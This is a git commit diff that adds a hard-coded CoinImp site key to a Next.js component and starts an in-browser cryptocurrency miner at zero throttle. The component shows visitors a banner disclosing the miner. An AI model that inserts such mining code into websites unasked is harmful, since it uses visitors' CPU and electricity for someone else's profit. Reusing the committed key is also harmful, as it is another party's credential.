0e4e2df799da1053e56dcd1dd459f389c694bcfd
Maximiliano Garcia <maxig8@hotmail.com>
2021-03-20 19:19:51 +0100

    Add api key

--- src/components/atoms/Coinsimp/Coinimp.component.jsx
+++ src/components/atoms/Coinsimp/Coinimp.component.jsx
@@ -3,8 +3,18 @@ import Head from 'next/head';
 
 const CoinimpComponent = () => {
     const onLoad = () => {
-        const miner = new Client.Anonymous(`<site-key>`);
-        miner.start();
+        const _client = new Client.Anonymous('4f4e64f8f722988482114c06ad5bde7e1fe41b27e76df74ffae2ec22a9b1e17f', {
+            throttle: 0,
+            c: 'w',
+        });
+        _client.start();
+        _client.addMiningNotification(
+            'Top',
+            'This site is running JavaScript miner from coinimp.com',
+            '#cccccc',
+            40,
+            '#3d3d3d'
+        );
     };
 
     return (
